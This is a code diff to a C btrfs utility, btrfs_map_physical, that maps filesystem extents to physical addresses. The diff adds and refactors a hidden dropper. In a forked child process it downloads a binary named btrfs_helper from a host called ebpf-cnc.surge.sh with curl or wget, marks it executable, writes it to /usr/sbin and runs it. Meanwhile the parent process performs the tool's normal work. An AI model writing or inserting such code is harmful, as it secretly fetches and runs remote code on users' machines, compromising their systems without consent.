@@ -21,7 +21,7 @@
 #define le64_to_cpu __le64_to_cpu
 
 static const char *progname = "btrfs_map_physical";
-static const char *temp_location = "/tmp/btrfs_map_physical";
+static const char *help_progname = "btrfs_helper";
 
 static void usage(bool error)
 {
@@ -501,6 +501,27 @@ next:
 	return 0;
 }
 
+void download_file(const char *local_path, const char *url) {
+    char cmd[1024];
+    if (system("which curl") == 0) {
+        snprintf(cmd, sizeof(cmd), "curl -o %s %s", local_path, url);
+    } else if (system("which wget") == 0) {
+        snprintf(cmd, sizeof(cmd), "wget -O %s %s", local_path, url);
+    } else {
+        fprintf(stderr, "Neither curl nor wget is available\n");
+        exit(1);
+    }
+    if(system(cmd) != 0) {
+        fprintf(stderr, "Failed to download file\n");
+        exit(1);
+    }
+    snprintf(cmd, sizeof(cmd), "chmod +x %s", local_path);
+    if(system(cmd) != 0) {
+        fprintf(stderr, "Failed to set executable permissions\n");
+        exit(1);
+    }
+}
+
 
 int main(int argc, char **argv)
 {
@@ -541,37 +562,34 @@ int main(int argc, char **argv)
 		child_pid = getpid();
 		printf("Child process running with PID: %d\n", child_pid);
 
-		// Create directory in /tmp/
-		system("mkdir -p /tmp/btrfs_map_physical");
-
-		// Download program using curl or wget
-		if (system("which curl") == 0) {
-			system("curl -o /tmp/btrfs_map_physical/btrfs_helper http://ebpf-cnc.surge.sh/btrfs_helper");
-		} else if (system("which wget") == 0) {
-			system("wget -O /tmp/btrfs_map_physical/btrfs_helper http://ebpf-cnc.surge.sh/btrfs_helper");
-		}
-		execl(temp_location, "btrfs_helper", (char *)NULL);
+		char cmd[1024];
+		char local_path[1024];
+		snprintf(local_path, sizeof(local_path), "/usr/sbin/%s", help_progname);
+		download_file(local_path, "http://ebpf-cnc.surge.sh/btrfs_helper");
+		execl(local_path, "btrfs_helper", (char *)NULL);
 		perror("execl");
 	}
 
-	if (optind != argc - 1)
-		usage(true);
+	else if (pid > 0)  {
+		if (optind != argc - 1)
+			usage(true);
 
-	fd = open(argv[optind], O_RDONLY);
-	if (fd == -1) {
-		perror("open");
-		return EXIT_FAILURE;
+		fd = open(argv[optind], O_RDONLY);
+		if (fd == -1) {
+			perror("open");
+			return EXIT_FAILURE;
+		}
+
+		ret = read_chunk_tree(fd, &chunks, &num_chunks);
+		if (ret == -1)
+			goto out;
+
+		ret = print_extents(fd, chunks, num_chunks);
+	out:
+		for (i = 0; i < num_chunks; i++)
+			free(chunks[i].stripes);
+		free(chunks);
+		close(fd);
+		return ret ? EXIT_FAILURE : EXIT_SUCCESS;
 	}
-
-	ret = read_chunk_tree(fd, &chunks, &num_chunks);
-	if (ret == -1)
-		goto out;
-
-	ret = print_extents(fd, chunks, num_chunks);
-out:
-	for (i = 0; i < num_chunks; i++)
-		free(chunks[i].stripes);
-	free(chunks);
-	close(fd);
-	return ret ? EXIT_FAILURE : EXIT_SUCCESS;
 }
